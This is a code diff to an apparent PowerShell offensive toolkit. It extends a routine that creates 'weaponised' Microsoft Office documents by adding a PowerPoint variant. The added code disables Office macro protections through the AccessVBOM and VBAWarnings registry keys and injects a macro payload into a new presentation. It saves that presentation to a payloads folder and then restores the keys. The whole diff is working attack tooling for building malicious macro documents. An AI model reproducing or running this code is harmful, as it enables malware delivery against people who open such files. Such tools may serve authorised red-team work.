@@ -459,12 +459,35 @@ UpdateMacro'
     $WordPage = $WordApp.Documents.Add()
     $WordVBA = $WordPage.VBProject.VBComponents.Add(1)
     $WordVBA.CodeModule.AddFromString($macrodoc)
-    $WordPage.SaveAs("$global:newdir\payloads\WordMacro", [Microsoft.Office.Interop.Word.Application]::xlWord8)
+    $WordPage.SaveAs("$global:newdir\payloads\WordMacro", [Microsoft.Office.Interop.Word.WdSaveFormat]::wdFormatDocument97)
     Write-Host -Object "Weaponised Microsoft Word Document written to: $global:newdir\payloads\WordMacro.doc"  -ForegroundColor Green
     $WordApp.Quit()
-    
+
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name AccessVBOM | Out-Null
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$WordVersion\Word\Security" -Name VBAWarnings | Out-Null
+
+    Add-Type -AssemblyName Microsoft.Office.Interop.Powerpoint
+    $PPTApp = New-Object -ComObject "Powerpoint.Application"
+    $PPTVersion = $PPTApp.Version
+    $PPTApp.visible = "msoTrue"
+
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null
+
+    $SlideType = "Microsoft.Office.Interop.Powerpoint.ppSlideLayout" -as [type]
+    $BlankLayout = $SlideType::ppLayoutTitleOnly
+
+    $PPTPage = $PPTApp.Presentations.Add()
+    $PPTVBA = $PPTPage.VBProject.VBComponents.Add(1)
+    $PPTVBA.CodeModule.AddFromString($macrodoc)
+    $PPTPage.SaveAs("$global:newdir\payloads\PowerpointMacro", [Microsoft.Office.Interop.Powerpoint.PpSaveAsFileType]::ppSaveAsPresentation)
+    Write-Host -Object "Weaponised Microsoft Powerpoint Document written to: $global:newdir\payloads\PowerpointMacro.ppt"  -ForegroundColor Green
+    $PPTApp.Quit()
+    $PPTApp = $null
+    Stop-Process -name "POWERPNT"
+
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name AccessVBOM | Out-Null
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$PPTVersion\Powerpoint\Security" -Name VBAWarnings | Out-Null
 
 }
 
